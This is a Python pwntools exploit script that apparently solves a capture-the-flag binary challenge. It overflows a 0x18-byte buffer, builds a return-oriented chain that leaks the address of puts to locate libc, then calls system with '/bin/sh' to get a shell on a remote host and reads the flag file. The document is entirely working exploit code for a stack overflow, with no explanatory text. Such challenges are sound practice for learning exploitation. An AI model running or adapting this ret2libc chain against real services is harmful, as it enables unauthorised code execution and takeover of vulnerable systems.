#!/usr/bin/env python3

from pwn import *
import struct

#context.log_level = "debug"
elf = ELF("./challenge", checksec=False)
context.binary = elf

libc = ELF("./libc.so.6", checksec=False)

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("34.125.199.248", 7809)

p.readuntil(b"What's your name?\n")

rop = ROP(elf)
rop.raw('A' * 0x18)
rop.puts(elf.got['puts'])
rop.raw(elf.sym['main'])
p.sendline(rop.chain())

p.readline()
p.readline()
leak = struct.unpack("<Q", p.read(6) + b"\x00\x00")[0]
log.success(f"leak: {hex(leak)}")

libc.address = leak - libc.sym["puts"]
log.success(f"libc: {hex(libc.address)}")

rop = ROP(libc)
rop.raw(b"A" * 0x18)
rop.rdi = p64(next(libc.search(b"/bin/sh\x00")))
rop.raw(p64(rop.find_gadget(['ret']).address)) # stack aligning ret
rop.call("system")
p.send(rop.chain())

p.readline()
p.readline()
p.readline()
p.readline()
p.sendline(b"/bin/cat /home/flag.txt")
log.success(p.readline().decode()) # OSCTF{l1br4ry_m4de_0f_5y5call5}
